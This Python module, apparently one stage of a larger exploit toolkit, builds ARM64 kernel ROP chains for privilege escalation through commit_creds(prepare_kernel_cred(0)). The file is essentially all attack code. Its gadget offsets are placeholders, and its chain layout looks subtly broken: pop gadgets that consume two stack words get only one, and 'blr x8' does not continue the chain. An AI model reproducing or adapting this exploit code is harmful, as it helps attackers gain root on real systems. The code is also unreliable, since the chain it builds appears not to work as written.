#!/usr/bin/env python3
"""
Stage 5: ROP Chain Construction Module

Builds ROP chains for privilege escalation on ARM64.
"""

from dataclasses import dataclass
from typing import List, Dict, Optional
import struct


@dataclass
class ROPGadget:
    """A single ROP gadget"""
    name: str
    address: int
    instructions: str
    clobbers: List[str] = None


class ROPChainBuilder:
    """Builds ROP chains for ARM64 kernel exploitation"""

    # Gadget templates (offsets relative to kernel base)
    GADGET_TEMPLATES = {
        "pop_x0": {"offset": 0x12345, "inst": "ldp x0, x30, [sp], #0x10; ret"},
        "pop_x1": {"offset": 0x12350, "inst": "ldp x1, x30, [sp], #0x10; ret"},
        "pop_x8": {"offset": 0x12360, "inst": "ldp x8, x30, [sp], #0x10; ret"},
        "blr_x8": {"offset": 0x12370, "inst": "blr x8"},
        "ret": {"offset": 0x12380, "inst": "ret"},
    }

    def __init__(self, kernel_base: int):
        self.kernel_base = kernel_base
        self.gadgets: Dict[str, ROPGadget] = {}
        self.chain: List[int] = []

        self._init_gadgets()

    def _init_gadgets(self):
        """Initialize gadget addresses based on kernel base"""
        for name, template in self.GADGET_TEMPLATES.items():
            self.gadgets[name] = ROPGadget(
                name=name,
                address=self.kernel_base + template["offset"],
                instructions=template["inst"]
            )

    def add_gadget(self, name: str, *args):
        """Add a gadget to the chain with arguments"""
        if name not in self.gadgets:
            raise ValueError(f"Unknown gadget: {name}")

        gadget = self.gadgets[name]
        self.chain.append(gadget.address)

        # Add arguments
        for arg in args:
            self.chain.append(arg)

    def build_privilege_escalation(self, commit_creds: int, prepare_kernel_cred: int) -> bytes:
        """
        Build privilege escalation ROP chain

        Equivalent to:
            commit_creds(prepare_kernel_cred(0))
        """
        self.chain = []

        # prepare_kernel_cred(0)
        self.add_gadget("pop_x0", 0)  # x0 = 0 (NULL for init_cred)
        self.add_gadget("pop_x8", prepare_kernel_cred)
        self.add_gadget("blr_x8")

        # commit_creds(result)
        # x0 already contains result from prepare_kernel_cred
        self.add_gadget("pop_x8", commit_creds)
        self.add_gadget("blr_x8")

        # Return to userspace
        self.add_gadget("ret")

        return self.serialize()

    def serialize(self) -> bytes:
        """Serialize chain to bytes"""
        return b''.join(struct.pack('<Q', addr) for addr in self.chain)

    def get_chain_addresses(self) -> List[str]:
        """Get human-readable chain representation"""
        return [f"0x{addr:016x}" for addr in self.chain]
